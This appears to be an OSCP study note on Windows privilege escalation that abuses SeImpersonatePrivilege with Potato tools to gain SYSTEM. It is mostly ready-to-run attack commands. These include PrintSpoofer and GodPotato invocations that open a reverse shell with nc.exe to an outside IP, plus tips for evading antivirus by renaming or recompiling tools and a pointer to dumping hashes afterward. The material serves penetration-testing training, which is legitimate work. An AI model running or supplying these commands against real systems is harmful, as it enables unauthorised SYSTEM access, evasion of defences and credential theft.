# 🪟 Token Privileges → Potato → SYSTEM

> The **most common web→SYSTEM path on OSCP**. Service accounts, `iis apppool`, and MSSQL service users usually hold **`SeImpersonatePrivilege`** — abuse it with a "Potato" tool to impersonate SYSTEM. Check `whoami /priv` first, always.

Part of [[Windows Privilege Escalation]]. Related: [[MSSQL]] · [[WinRM]] · [[Shells]]

---

## 🧠 THINK
- **`whoami /priv`** is the single highest-value Windows command.
- **`SeImpersonatePrivilege`** or **`SeAssignPrimaryTokenPrivilege`** = Enabled → Potato → SYSTEM.
- Pick the right Potato for the OS build; **GodPotato** has the widest coverage.
- Common on shells from web/[[MSSQL]] — check this before anything else.

## ⚡ DETECT
```cmd
whoami /priv
```
**Look for:** `SeImpersonatePrivilege ... Enabled` (or `SeAssignPrimaryTokenPrivilege`). Also note `SeBackup/SeRestore/SeLoadDriver` → [[Windows Special Privileges]].

## 💥 EXPLOIT (transfer the tool, then run)
**PrintSpoofer** (Win10 / Server 2016/2019):
```cmd
PrintSpoofer.exe -i -c cmd
```
Get a SYSTEM reverse shell instead of interactive:
```cmd
PrintSpoofer.exe -c "C:\Windows\Temp\nc.exe 10.10.14.5 443 -e cmd"
```
**GodPotato** (broad coverage, needs .NET):
```cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"
```
```cmd
GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe 10.10.14.5 443 -e cmd"
```
**Others:** JuicyPotatoNG / RoguePotato (older setups / when the above don't fire).
Transfer tools via SMB or certutil → [[File Transfer Cheat Sheet]].

## 🔁 FOUND → NEXT
| FINDING | NEXT |
|---|---|
| `SeImpersonate` Enabled | PrintSpoofer/GodPotato → SYSTEM |
| `SeAssignPrimaryToken` | same Potato path |
| SYSTEM obtained | dump hashes → [[Dumping Windows Hashes]] |
| Potato won't fire | match OS build; try GodPotato; confirm priv Enabled |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| No `SeImpersonate` | pivot to [[Windows Service Exploits]] / [[AlwaysInstallElevated]] / [[Windows Stored Credentials]] |
| Potato returns nothing | wrong Potato for the build — try **GodPotato** (widest); verify privilege is *Enabled* not just present |
| .NET missing (GodPotato) | use PrintSpoofer; or install/point to right .NET version |
| AV kills the tool | rename/recompile; run from `C:\Windows\Temp`; try a different Potato |

## 📇 CHEAT SHEET
```cmd
whoami /priv
```
```cmd
PrintSpoofer.exe -i -c cmd
```
```cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"
```
**Kill shot:** `SeImpersonate` → PrintSpoofer/GodPotato → SYSTEM → [[Dumping Windows Hashes]].
